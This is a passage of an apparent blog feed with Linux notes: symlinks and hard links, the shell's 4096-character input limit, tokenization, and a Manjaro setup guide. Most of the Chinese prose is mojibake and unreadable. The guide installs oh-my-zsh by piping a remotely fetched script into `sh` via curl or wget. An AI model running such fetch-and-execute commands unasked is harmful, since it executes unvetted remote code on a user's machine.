id="ç¬¦å·é“¾æ¥">ç¬¦å·é“¾æ¥</h2><p>ç¬¦å·é“¾æ¥ï¼šæ˜¯ä¸€ä¸ªå­˜å‚¨æ–‡ä»¶ï¼ˆå¤¹ï¼‰ä½ç½®çš„å¿«æ·æ–¹å¼ï¼Œæ“ä½œç³»ç»Ÿæ‰¾è¿™ä¸ªå¿«æ·æ–¹å¼ï¼ˆæ–‡ä»¶ï¼Œç›®å½•åï¼‰ï¼Œç„¶åå†å¼•ç”¨åˆ°</p><p><code>ls -i</code> æŸ¥çœ‹ inode å·</p><p>åˆ›å»ºï¼š <code>ln -s filename soft_ln_nane</code></p><ol type="1"><li>è½¯é“¾æ¥æœ‰è‡ªå·±çš„æ–‡ä»¶å±æ€§åŠæƒé™ç­‰ï¼›</li><li>å¯å¯¹ä¸å­˜åœ¨çš„æ–‡ä»¶æˆ–ç›®å½•åˆ›å»ºè½¯é“¾æ¥ï¼›</li><li>è½¯é“¾æ¥å¯äº¤å‰æ–‡ä»¶ç³»ç»Ÿï¼›</li><li>è½¯é“¾æ¥å¯å¯¹æ–‡ä»¶æˆ–ç›®å½•åˆ›å»ºï¼›</li><li>åˆ›å»ºè½¯é“¾æ¥æ—¶ï¼Œé“¾æ¥è®¡æ•° i_nlink ä¸ä¼šå¢åŠ ï¼›</li><li>åˆ é™¤è½¯é“¾æ¥å¹¶ä¸å½±å“è¢«æŒ‡å‘çš„æ–‡ä»¶ï¼Œä½†è‹¥è¢«æŒ‡å‘çš„åŸæ–‡ä»¶è¢«åˆ é™¤ï¼Œåˆ™ç›¸å…³è½¯è¿æ¥è¢«ç§°ä¸ºæ­»é“¾æ¥ï¼ˆè‹¥è¢«æŒ‡å‘è·¯å¾„æ–‡ä»¶è¢«é‡æ–°åˆ›å»ºï¼Œæ­»é“¾æ¥å¯æ¢å¤ä¸ºæ­£å¸¸çš„è½¯é“¾æ¥ï¼‰ã€‚</li></ol><h2 id="ç¡¬é“¾æ¥">ç¡¬é“¾æ¥</h2><p>ç¡¬é“¾æ¥æ˜¯æœ‰ç€ç›¸åŒ inodeå·ï¼Œä»…æ–‡ä»¶åä¸åŒçš„æ–‡ä»¶ï¼Œå› æ­¤ç¡¬é“¾æ¥å­˜åœ¨ä»¥ä¸‹å‡ ç‚¹ç‰¹æ€§ï¼š</p><ol type="1"><li>æ–‡ä»¶æœ‰ç›¸åŒçš„ inode åŠ data blockï¼›</li><li>åªèƒ½å¯¹å·²å­˜åœ¨çš„æ–‡ä»¶è¿›è¡Œåˆ›å»ºï¼›</li><li>ä¸èƒ½äº¤å‰æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œç¡¬é“¾æ¥çš„åˆ›å»ºï¼› inodeå·ä»…åœ¨å„æ–‡ä»¶ç³»ç»Ÿä¸‹æ˜¯å”¯ä¸€çš„ï¼Œå½“ Linux æŒ‚è½½å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿåå°†å‡ºç° inodeå·é‡å¤çš„ç°è±¡ï¼Œå› æ­¤ç¡¬é“¾æ¥åˆ›å»ºæ—¶ä¸å¯è·¨æ–‡ä»¶ç³»ç»Ÿã€‚</li><li>ä¸èƒ½å¯¹ç›®å½•è¿›è¡Œåˆ›å»ºï¼Œåªå¯å¯¹æ–‡ä»¶åˆ›å»ºï¼›</li><li>åˆ é™¤ä¸€ä¸ªç¡¬é“¾æ¥ï¼Œå¹¶ä¸ç­‰äºåˆ é™¤æ–‡ä»¶ï¼Œ ç›´åˆ°æ–‡ä»¶çš„å¼•ç”¨è®¡æ•°ä¸º 0æ—¶ï¼Œæ–‡ä»¶æ‰ä¼šè¢«åˆ é™¤ã€‚</li></ol><h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2><p><ahref="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html">ç†è§£Linux çš„ç¡¬é“¾æ¥ä¸è½¯é“¾æ¥</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hardlink </tag>
            
            <tag> softlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell input 4096-limit</title>
      <link href="/blog/2020/07/23/programming/shell/shell_input_limit/"/>
      <url>/blog/2020/07/23/programming/shell/shell_input_limit/</url>
      
        <content type="html"><![CDATA[<h2 id="é—®é¢˜">é—®é¢˜</h2><p>Linux shell å‘½ä»¤è¡Œæ¯æ¬¡æ”¶å– 4096ä¸ªå­—ç¬¦çš„è¾“å…¥(4kB)ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸ªæ•°è¶…è¿‡è¯¥æ•°å­—åé¢çš„è¢«ä¸¢å¼ƒã€‚åŸå› æ˜¯ shellçš„è¾“å…¥æ˜¯ä¸ºäººè®¾è®¡çš„ï¼Œè€Œäººä¸ä¼šæ‰‹åŠ¨è¾“å…¥é‚£ä¹ˆå¤šã€‚å¦‚æœæƒ³è¦åœ¨ shell é‡Œé¢è¿è¡Œshellã€python è„šæœ¬è·å–å¤§äº 4096ä¸ªå­—ç¬¦çš„è¾“å…¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<strong>è¯»å–æ–‡ä»¶æˆ–è€…æ–‡ä»¶è¾“å‡ºé‡å®šå‘çš„æ–¹å¼</strong>ã€‚</p><p>è¿™ä¸ªé—®é¢˜æ˜¯æˆ‘åœ¨ hackerrank ä¸Šåˆ·ä¸€é“ pythoné¢˜ç›®çš„æ—¶å€™ï¼Œè°ƒè¯•å¤§é‡è¾“å…¥çš„æ—¶å€™å‘ç°çš„ã€‚åœ¨ç½‘ä¸ŠæŸ¥æ‰¾äº†åŠå¤©å‘ç°çš„ï¼ŒåŠ æ²¹ï¼Œå­¦å‘€ã€‚</p><h2 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h2><blockquote><ol type="1"><li><a href="http://blog.chaitanya.im/4096-limit">Why is there a 4096character limit on text input in the shell</a></li><li><ahref="https://stackoverflow.com/questions/52250059/bash-read-discards-terminal-line-input-after-4096-bytes">bash:read discards terminal line input after 4096 bytes è¿™ä¸ªæ˜¯å…³äº readçš„ï¼Œä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>String Tokenization</title>
      <link href="/blog/2020/07/23/programming/python/str_tokenize/"/>
      <url>/blog/2020/07/23/programming/python/str_tokenize/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>Tokenization is the process of dividing text into a set of meaningfulpieces. These pieces are called tokens. For example, we can divide achunk of text into words, or we can divide it into sentences.</p><p>Tokenization is the process of tokenizing or splitting a string, textinto a list of tokens. One can think of token as parts like a word is atoken in a sentence, and a sentence is a token in a paragraph.</p><h2 id="references">References</h2><blockquote><p><ahref="https://www.oreilly.com/library/view/python-machine-learning/9781786464477/ch06s02.html">Preprocessingdata using tokenization</a> &gt; <ahref="https://www.geeksforgeeks.org/nlp-how-tokenizing-text-sentence-words-works/">NLP| How tokenizing text, sentence, words works</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Manjaro ç³»ç»Ÿé…ç½®</title>
      <link href="/blog/2020/07/23/linux/manjaro/manjaro_config/"/>
      <url>/blog/2020/07/23/linux/manjaro/manjaro_config/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>ç”¨äº† Manjaro æœ‰åŠå¹´å·¦å³äº†ï¼Œä¹‹å‰ç”¨äº†Ubuntuï¼Œæ€»æ˜¯è®¨åŒå®ƒç¥–ä¼ çš„å†…éƒ¨é”™è¯¯ï¼Œåé¢è£…äº†é»‘è‹¹æœï¼Œæ„Ÿè§‰ä¹Ÿä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œè€Œä¸”åˆ°å¤„éƒ½æ˜¯èŠ±é’±çš„è½¯ä»¶ï¼Œæœ‰äº›è´¨é‡è¿˜æ²¡æœ‰ Windowsä¸Šå…è´¹çš„å¥½ç”¨ã€‚åé¢å¬è¯´è¿‡ Manjaroä¸é”™ï¼Œä¾¿è£…ä¸Šäº†åŒç³»ç»Ÿï¼Œä¸€ç›´ç”¨åˆ°ç°åœ¨ï¼Œç›®å‰ä¸»åŠ›ç³»ç»Ÿæ˜¯ Manjaro,éœ€è¦è…¾è®¯ç³»è½¯ä»¶æˆ–è€… Microsoft Office æ—¶ï¼Œæ‰ä¼šåˆ‡æ¢åˆ° Windows, è¶Šæ¥è¶Šæ„Ÿè§‰Manjaro å¥½ç”¨äº†ã€‚å®ƒè‡ªå¸¦çš„å¾ˆå¤šè½¯ä»¶çš„åŠŸèƒ½éƒ½è¿œè¿œè¶…è¿‡äº† Windows è‡ªå¸¦çš„ï¼Œè€Œä¸”Linux çš„æ¡Œé¢ç¯å¢ƒè¿œè¿œå¼ºäº Windows æ¡Œé¢ç¯å¢ƒã€‚</p><p>Manjaro Linuxï¼ˆæˆ–ç®€ç§° Manjaroï¼‰æ˜¯åŸºäº Arch Linux çš„ Linuxå‘è¡Œç‰ˆã€‚</p><p>ç‰¹ç‚¹ï¼š</p><ul><li>å¯¹æ˜¾å¡é©±åŠ¨çš„å…¼å®¹æ€§æå…¶ä¹‹é«˜ï¼Œå¯è‡ªä¸»é€‰æ‹©å®‰è£…å¼€æºé©±åŠ¨æˆ–è€…é—­æºé©±åŠ¨ã€‚</li><li>é‡‡ç”¨æ»šåŠ¨æ›´æ–°ï¼ˆæ„å‘³ç€ç”¨æˆ·æ— éœ€é€šè¿‡é‡è£…ç³»ç»Ÿæˆ–ç³»ç»Ÿæ›´æ–°æ¥æ›´æ–°è‡ªå·±çš„æ“ä½œç³»ç»Ÿï¼‰ã€‚è€Œä¸”å¯¹Arch ç¨³å®šæ€§å’Œæ¿€è¿›åº¦å¹³è¡¡æ§åˆ¶æå¥½ã€‚</li><li>AUR è½¯ä»¶ä»“åº“æœ‰ç€ä¸–ç•Œä¸Šæœ€é½å…¨çš„ Linux è½¯ä»¶</li><li>æœ€å¼ºå¤§ä¸°å¯Œçš„ wikiå’Œæ´»è·ƒçš„ç¤¾åŒºè®©æ‰€æœ‰é—®é¢˜éƒ½å¯ä»¥å¿«é€Ÿå¾—åˆ°æ»¡æ„çš„ç­”æ¡ˆ</li><li>Manjaro æä¾›æ”¯æŒçš„æ¡Œé¢ç¯å¢ƒä¼—å¤šï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ä¸€ä¸ª <strong>ManjaroKDE</strong>ï¼ŒKDE æ“ä½œç•Œé¢ç±»ä¼¼ Windows çš„æ“ä½œç•Œé¢</li></ul><h2 id="åˆå§‹åŒ–é…ç½®">åˆå§‹åŒ–é…ç½®</h2><p>é…ç½®å½“ä¸‹åœ¨å›½å†…æœ€å¿«çš„é•œåƒæºï¼Œæˆ‘è¿™è¾¹ä¸€èˆ¬æ˜¯æ¸…åæºå’Œé˜¿é‡Œæºæ¯”è¾ƒå¿«ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank</span><br></pre></td></tr></table></figure><p>ä¸ä¸€ä¼šï¼Œå®ƒä¼šå¼¹çª—è®©ä½ é€‰æ‹©æºï¼Œä½ æ ¹æ®æ˜¾ç¤ºçš„å»¶è¿Ÿï¼Œé€‰å»¶è¿Ÿæœ€ä½çš„å°±å¥½ã€‚</p><h3 id="é…ç½®-archlinux-ä»“åº“æº">é…ç½® ArchLinux ä»“åº“æº</h3><ol type="1"><li><p>å…ˆå®‰è£…ä¸€ä¸‹ vim ä¾¿äºåç»­æ“ä½œ</p><p><code>sudo pacman -S vim</code> å¦‚æœæ­¤æ—¶å®‰è£…ä¸äº†ï¼Œé‚£å…ˆæ›´æ–°ä¸€ä¸‹ç³»ç»Ÿï¼š<code>sudo pacman -Syyu</code></p></li><li><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä½¿ç”¨æ¸…åæº</p><p><code>sudo vim /etc/pacman.conf</code> å‘è¯¥æ–‡ä»¶æœ«å°¾å¢åŠ ä¸‹é¢è¯­å¥ï¼ˆ<code>shift+g</code> è·³åˆ°æ–‡ä»¶æœ«å°¾ï¼Œ <code>i</code><code>ç¼–è¾‘ï¼Œesc</code> é€€å‡ºç¼–è¾‘ï¼Œ <code>shift+z</code>è¿ç»­ä¸¤ä¸‹ä¿å­˜é€€å‡ºï¼‰</p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel= TrustedOnly</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch</span><br></pre></td></tr></table></figure></p></li><li><p>å®‰è£…å¯†é’¥</p><p><code>sudo pacman -Syu archlinuxcn-keyring</code> å¦‚æœé‡åˆ°äº†<strong>Unable to lock database</strong> é”™è¯¯ï¼šæ‰§è¡Œå‘½ä»¤ï¼š<code>sudo rm /var/lib/pacman/db.lck</code></p></li></ol><h3 id="æ›´æ–°ç³»ç»Ÿ">æ›´æ–°ç³»ç»Ÿ</h3><p>æ›´æ–°ç³»ç»Ÿï¼š <code>sudo pacman -Syyu</code> è®© Manjaro ä½¿ç”¨LocalTimeï¼Œè§£å†³ä¸ Windows å…±å­˜ä¸»æ¿æ—¶é—´å†²çªé—®é¢˜ï¼š<code>sudo timedatectl set-local-rtc true</code></p><h2 id="å®‰è£…é…ç½®-aur-åŒ…ç®¡ç†">å®‰è£…é…ç½® aur åŒ…ç®¡ç†</h2><p><code>sudo pacman -S yay</code> Yay é»˜è®¤ä½¿ç”¨æ³•å›½çš„<code>aur.archlinux.org</code> ä½œä¸º AURæºï¼Œå¯ä»¥æ›´æ”¹ä¸ºå›½å†…æ¸…åå¤§å­¦æä¾›çš„é•œåƒã€‚</p><p>yay ç”¨æˆ·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä¿®æ”¹ auÂ­rurlï¼š</p><p><code>yay --aururl "https://aur.tuna.tsinghua.edu.cn" --save</code>ä¿®æ”¹çš„é…ç½®æ–‡ä»¶ä½äº <code>~/.config/yay/config.json</code>æ³¨ï¼šè¿™ä¸¤å¤©æ¸…åæºå´©äº†ï¼Œä¸çŸ¥é“åé¢ä¼šä¸ä¼šå¥½ã€‚</p><h2 id="å¸¸ç”¨å‘½ä»¤">å¸¸ç”¨å‘½ä»¤</h2><p>å®‰è£…è½¯ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Ss string             # åœ¨åŒ…æ•°æ®åº“ä¸­æŸ¥è¯¢è½¯ä»¶</span><br><span class="line">sudo pacman -S package_name        # å®‰è£…è½¯ä»¶</span><br><span class="line">sudo pacman -U package.tar.zx      # ä»æœ¬åœ°æ–‡ä»¶å®‰è£…</span><br><span class="line">sudo pacman -R package_name        # åˆ é™¤å•ä¸ªè½¯ä»¶</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°æ‰€æœ‰ pacman xxx å‘½ä»¤ï¼Œå‡å¯æ›¿æ¢æˆ yay xxx æ‰§è¡Œ</p><h2 id="å¿…å¤‡å·¥å…·">å¿…å¤‡å·¥å…·</h2><p><code>sudo pacman -S git net-tools iproute2 tree vim</code></p><h3 id="è¾“å…¥æ³•">è¾“å…¥æ³•</h3><ul><li>Arch based Linux å»ºè®®ä½¿ç”¨çš„ fcitx æ¡†æ¶ï¼Œ å› ä¸ºæ®è¯´å¼€å‘è€…æ˜¯ Arch Linuxç”¨æˆ·</li><li>RIME ä¸­å·éŸµè¾“å…¥æ³•æ˜¯ Linux ä¸‹å¹¿å—å¥½è¯„çš„ä¸­æ–‡è¾“å…¥æ³•ã€‚</li><li>Fcitx5 ç›®å‰ä½¿ç”¨å¾ˆä½“éªŒä¸é”™äº†</li></ul><p>æˆªæ­¢æœ¬æ–‡æ›´æ–°æ—¥æœŸä¹‹é™…ï¼Œç›®å‰è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆæœ‰ä¸¤ç§ï¼š</p><ol type="1"><li><p>fcitx4/fcitx5 + rime + è¯åº“</p><p><ahref="https://github.com/violetu/mybackup/tree/master/configurations/rime_config">æˆ‘çš„rime é…ç½®</a>é™¤äº†å¸¸ç”¨è¯å…¸å¤–ï¼Œæˆ‘è¿˜å•ç‹¬å°†æœç‹—è¯åº“ä¸­ä¸è®¡ç®—æœºï¼Œè½¯ä»¶ï¼Œç½‘ç»œï¼Œå®‰å…¨ï¼Œé»‘å®¢ç›¸å…³è¯æ±‡è½¬æ¢æ·»åŠ äº†è¿›å»ã€‚</p></li><li><p>fcitx5 è‡ªå¸¦çš„ pingyin + è‚¥çŒ«ç»´åŸºç™¾ä¸‡å¤§è¯åº“ï¼ˆæ¨èï¼‰</p><p>å®‰è£…æ•™ç¨‹ï¼š<ahref="https://violetus.life/os/manjaro/fcitx5/">fcitx5ã€è¾“å…¥æ³•ã€è¯åº“å®‰è£…é…ç½®</a></p></li><li><p>å…¶ä»–ï¼ˆä¸ªäººä¸æ¨èï¼‰</p><ol type="1"><li><p>æœç‹—ï¼Œä¸»è¦æ˜¯å› ä¸ºå®ƒè¿˜æ˜¯åŸºäº Qt4ï¼Œ bugè¿˜æœ‰ä¸€äº›å½±å“ä½“éªŒï¼Œè¿˜è¦å…³é—­äº‘è¾“å…¥è§£å†³äº† CPUé£™å‡é—®é¢˜ï¼Œè€Œä¸”è¿˜æ˜¯æœç‹—ï¼Œä½ æ‡‚çš„ã€‚</p></li><li><p>ç™¾åº¦æ‹¼éŸ³ï¼Œ ä»Šå¹´æ‰å‡ºï¼Œç”¨äº†ä¸€æ®µæ—¶é—´è¿˜è¡Œï¼Œbugè¿˜æ˜¯æœ‰ä¸€äº›ï¼Œä¸è¿‡ä¸å¤ªå½±å“ä½“éªŒï¼Œä¸è¿‡ï¼Œç™¾åº¦ï¼Œä½ æ‡‚çš„ï¼Œç”¨ç€å¿ƒé‡Œéš”åº”ã€‚</p></li></ol></li></ol><p>æœ‰ä¸Šé¢æåˆ°çš„ä¸¤ç§ä»…ä»…ä½¿ç”¨å¼€æºè½¯ä»¶çš„å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œä¸ºä»€ä¹ˆä¸ç”¨ï¼Ÿå®ƒä¸é¦™å˜›</p><h3 id="æµè§ˆå™¨">æµè§ˆå™¨</h3><p><code>sudo pacman -S firefox google-chrome</code></p><ul class="task-list"><li><label><input type="checkbox" />å¾…è¡¥å……ï¼Œ Plasma integration æ’ä»¶ï¼Œkde é…åˆ</label></li></ul><h3 id="ç§‘å­¦ä¸Šç½‘">ç§‘å­¦ä¸Šç½‘</h3><ol type="1"><li><p>è½¯ä»¶å®‰è£…</p><p>shadowsocks v5ï¼Œå®‰è£…å°é£æœºï¼š <code>sudo pacman -S electron-ssr</code>v2rayï¼Œ æˆ‘ä¹ æƒ¯ä½¿ç”¨ Qv2rayï¼š <code>sudo pacman -S qv2ray</code> è¿›é˜¶ï¼šQv2ray é«˜çº§è·¯ç”±é…ç½® 1. <ahref="https://qv2ray.github.io/manual/route.html#%E5%85%A8%E5%B1%80%E8%B7%AF%E7%94%B1%E8%A7%84%E5%88%99">é«˜çº§è·¯ç”±è®¾ç½®</a>2. <ahref="https://github.com/Loyalsoldier/v2ray-rules-dat">v2ray-rules-dat</a></p></li><li><p>è®¢é˜…</p><p><code>electron-ssr</code> åªèƒ½è®¢é˜… ssr, è€Œ Qv2ray ä¸ä»…é»˜è®¤æ”¯æŒ v2rayçš„ vmess åè®®ï¼Œé€šè¿‡æ’ä»¶è¿˜å¯ä»¥æ”¯æŒæ”¯æŒ ssrï¼Œ å› æ­¤ï¼Œæˆ‘ç›®å‰åªç”¨ qv2rayäº†</p></li></ol><h3 id="ç»ˆç«¯ä»£ç†">ç»ˆç«¯ä»£ç†</h3><p>proxychains-ng åŸç† ç®€å•çš„è¯´å°±æ˜¯è¿™ä¸ªç¨‹åº Hook äº† socketsç›¸å…³çš„æ“ä½œï¼Œè®©æ™®é€šç¨‹åºçš„ sockets æ•°æ®èµ° SOCKS/HTTP ä»£ç†ã€‚</p><ol type="1"><li><p>å®‰è£…</p><p><code>sudo pacman -S proxychains-ng</code></p></li><li><p>ç½®ä»£ç†åè®®ä¸ç«¯å£</p><p><code>vim /etc/proxychains.conf</code> å°†è¯¥æ–‡ä»¶é‡Œé¢çš„<code>socks4 127.0.0.1 9095</code> å½¢å¼çš„é‚£ä¸€è¡Œï¼Œæ”¹ä¸º<code>socks5 127.0.0.1 1080</code> ã€‚ æ³¨æ„ï¼š <code>1080</code>è¯¥å€¼ï¼Œåº”ä¸ºä½ è‡ªå·±çš„ä»£ç†è½¯ä»¶ç›‘å¬ä»£ç†çš„ç«¯å£ï¼Œéœ€è¦è‡ªè¡Œåœ¨ä»£ç†è½¯ä»¶é…ç½®é‚£é‡Œè·å¾—ã€‚</p></li><li><p>ä½¿ç”¨</p><p>åœ¨å‘½ä»¤å‰åŠ ä¸Š <code>proxychains4</code> å³å¯ã€‚ æµ‹è¯•å‘½ä»¤ï¼š<code>proxychains4 curl www.google.com</code></p></li></ol><p><strong>Notice</strong>ï¼š</p><p>å¦‚æœä½ æ²¡æœ‰ä¿®æ”¹ yay çš„æºçš„è¯ï¼Œä½¿ç”¨ yayä¸‹è½½å®˜æ–¹ä»“åº“çš„ä¸œè¥¿æ—¶ï¼Œå¯èƒ½ä¼šå¾ˆæ…¢ï¼Œéœ€è¦ä»£ç†ã€‚ä½†æ˜¯ <code>yay</code>ç”±äºæœ¬èº«åŸå› ï¼Œä¸æ”¯æŒ proxychains ä»£ç†ï¼Œä½ å¯é‡æ–°ç¼–è¯‘å…¶ä»–ç‰ˆæœ¬ yayæˆ–è€…ä½¿ç”¨ä¸´æ—¶ç¯å¢ƒå˜é‡è®¾ç½® HTTPä»£ç†ï¼ˆç«¯å£åŒæ ·æ˜¯éœ€è¦åœ¨ä»£ç†è½¯ä»¶é…ç½®é‚£é‡Œè·å¾—ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export https_proxy=&quot;http://127.0.0.1:8888&quot;</span><br><span class="line">export http_proxy=&quot;http://127.0.0.1:8888&quot;</span><br></pre></td></tr></table></figure><h2 id="ç¼–ç¨‹å¼€å‘">ç¼–ç¨‹å¼€å‘</h2><h3 id="zshoh-my-zsh">zsh/oh-my-zsh</h3><h4 id="åˆ‡æ¢-zsh">åˆ‡æ¢ zsh</h4><p>Manjaro linux é»˜è®¤å®‰è£…äº† zsh æŸ¥çœ‹æœ¬åœ°æœ‰å“ªå‡ ç§ shellï¼š<code>cat /etc/shells</code> åˆ‡æ¢ shell åˆ° zshï¼š<code>chsh -s /bin/zsh</code></p><ol type="1"><li><p>é»˜è®¤ç»ˆç«¯å¯åŠ¨ zsh éœ€è¦åœ¨ç»ˆç«¯ä¸­è¿›è¡Œé…ç½®ï¼š</p><p><code>Ctrl+Alt+t</code> å¿«æ·é”®æ‰“å¼€ <code>Konsole</code> ï¼Œ è¿›å…¥:<code>Settings -&gt; configure Konsole -&gt; Profile</code> ï¼Œç„¶åå³ä¾§<code>New</code> ï¼Œåå­—éšæ„ï¼ŒCommand å¡«å†™ <code>/usr/bin/zsh</code>ï¼Œç„¶å Applyï¼Œ OK</p></li></ol><h4 id="oh-my-zsh-é…ç½®">oh-my-zsh é…ç½®</h4><ol type="1"><li><p>ä¸‹è½½å®‰è£…</p><p><strong>æ³¨æ„ï¼š rootç”¨æˆ·å’Œæ™®é€šç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…é…ç½®ï¼Œå³åˆ†åˆ«åˆ‡æ¢åˆ°æ™®é€šå’Œ rootç”¨æˆ·å®‰è£…</strong></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">curl æˆ–è€…æ˜¯ wgetï¼ŒäºŒè€…é€‰å…¶ä¸€å³å¯</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">via curl</span></span><br><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">via wget</span></span><br><span class="line">sh -c &quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æƒ³è¦å¸è½½oh-my-zsh è¾“å…¥ä»¥ä¸‹å‘½ä»¤</span></span><br><span class="line">uninstall_oh_my_zsh</span><br></pre></td></tr></table></figure></p></li><li><p>å¸¸ç”¨æ’ä»¶å®‰è£…</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¯­æ³•é«˜äº®æ’ä»¶ zsh-syntax-highlighting</span></span><br><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è‡ªåŠ¨è¡¥å…¨æ’ä»¶</span></span><br><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure></p></li><li><p>å®‰è£…å®Œåå¯ç”¨æ’ä»¶</p><p><code>sudo vim ~/.zshrc</code> æœç´¢åˆ° pluginsï¼Œåœ¨æ‹¬å·åæ‹¬å·é‡Œæ·»åŠ å®‰è£…çš„æ’ä»¶åå­—</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plugins=( git</span><br><span class="line">            zsh-autosuggestions</span><br><span class="line">            zsh-syntax-highlighting</span><br><span class="line">            )</span><br></pre></td></tr></table></figure></p></li><li><p>ä½¿å…¶åœ¨å½“å‰ shell ä¸­ç”Ÿæ•ˆ</p><p><code>source ~/.zshrc</code></p></li></ol><h3 id="ideeditor">IDE/Editor</h3><p>PyCharm å’Œ vscode</p><p><code>sudo pacman -S pycharm-professional visual-studio-code-bin</code></p><h3 id="go">GO</h3><p><code>yay -S go go-tools</code></p><h3 id="oracle-jdk8">Oracle jdk8</h3><p>å½“ç„¶ï¼Œç›®å‰å¤§éƒ¨åˆ†åº”ç”¨éƒ½å¼€å§‹ä½¿ç”¨ java 11 æˆ–è€… java 13äº†ï¼Œä½†æ˜¯å®‰è£…æ•™ç¨‹ä¸å˜ï¼ŒæŠŠå¯¹åº”åŒ…ï¼Œæ•°å­—ç­‰æœç€æ”¹å°±è¡Œäº†ï¼ˆæˆ‘æ‡’å¾—æ”¹äº†ï¼‰.</p><ol type="1"><li><p>å» oracle å®˜ç½‘ä¸‹è½½ tar åŒ…ï¼Œ æˆ‘ä¸‹è½½çš„æ˜¯ï¼š<code>jdk-8u241-linux-x64.tar.gz</code></p></li><li><p>å°†å…¶ç§»åŠ¨åˆ° <code>~/Download</code> ç›®å½•ä¸‹</p></li><li><p>åœ¨è¯¥è·¯å¾„ä¸‹æ‰“å¼€ç»ˆç«¯ï¼Œ è¾“å…¥ <code>yay jdk8</code></p></li><li><p>é€‰æ‹©å’Œä½ ä¸‹è½½çš„åŒ…åä¸€è‡´çš„é‚£ä¸ª</p><p>å¯ä»¥ä½¿ç”¨ <code>yay jdk8|grep 8u241</code> ï¼Œæ‰¾åˆ°ä»–æ˜¯ç¬¬å‡ ä¸ªï¼Œç„¶ååœ¨è¿è¡Œ <code>yay jdk8</code>ï¼Œè¾“å…¥åºå·å³å¯ã€‚</p></li><li><p>ç‚¹å‡» jar åŒ…ï¼Œè¿è¡Œ</p><ol type="1"><li>é…ç½®: jar åŒ…ä¸Šï¼Œå³é”® open withï¼Œ åœ¨ç©ºè¡Œä¸­è¾“å…¥<code>java -jar</code></li><li>åœ¨å‡ ä¹æœ€ä¸‹æ–¹å‹¾é€‰ å‹¾é€‰æ¡†ï¼Œ ä½¿å¾—æ‰€æœ‰ jar åŒ…éƒ½å¯ä»¥è¿™æ ·æ‰§è¡Œã€‚</li></ol></li></ol><h3 id="docset-ç¦»çº¿æ–‡æ¡£">Docset ç¦»çº¿æ–‡æ¡£</h3><p><code>yay -S zeal</code></p><h2 id="åŠå…¬ç”Ÿäº§åŠ›">åŠå…¬ç”Ÿäº§åŠ›</h2><h3 id="office">Office</h3><p>ç›®å‰çš„ WPS å’Œ Libreoffice å¯¹ 